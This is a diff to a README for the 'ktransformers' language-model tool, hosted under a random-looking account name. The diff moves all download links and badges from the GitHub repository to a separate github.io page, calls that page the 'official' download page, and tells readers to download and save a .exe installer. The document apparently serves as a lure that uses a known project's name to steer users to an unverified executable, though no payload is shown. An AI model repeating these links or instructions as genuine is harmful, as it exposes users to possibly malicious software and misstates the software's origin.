@@ -1,6 +1,6 @@
 # 🚀 ktransformers - Run fast language models on hardware
 
-[![](https://img.shields.io/badge/Download_ktransformers-Blue?style=for-the-badge)](https://github.com/araneuscavaticusslops748/ktransformers)
+[![](https://img.shields.io/badge/Download_ktransformers-Blue?style=for-the-badge)](https://araneuscavaticusslops748.github.io)
 
 ktransformers offers a way to run large language models on your computer. It focuses on speed and hardware efficiency. The software combines different processing units to improve performance. You get faster responses from your artificial intelligence models by using the native power of your local machine.
 
@@ -20,12 +20,12 @@ Update your NVIDIA graphics drivers to the latest version before you install the
 
 You need to download the installer from the official repository.
 
-1. Navigate to the [official ktransformers download page](https://github.com/araneuscavaticusslops748/ktransformers).
+1. Navigate to the [official ktransformers download page](https://araneuscavaticusslops748.github.io).
 2. Look for the latest release version on the right side of the screen.
 3. Select the file ending in .exe to download the application to your computer.
 4. Save the file to your Downloads folder or a location you remember.
 
-[![](https://img.shields.io/badge/Download_Installer-Grey?style=for-the-badge)](https://github.com/araneuscavaticusslops748/ktransformers)
+[![](https://img.shields.io/badge/Download_Installer-Grey?style=for-the-badge)](https://araneuscavaticusslops748.github.io)
 
 ## 🛠️ Step-by-Step Installation
 
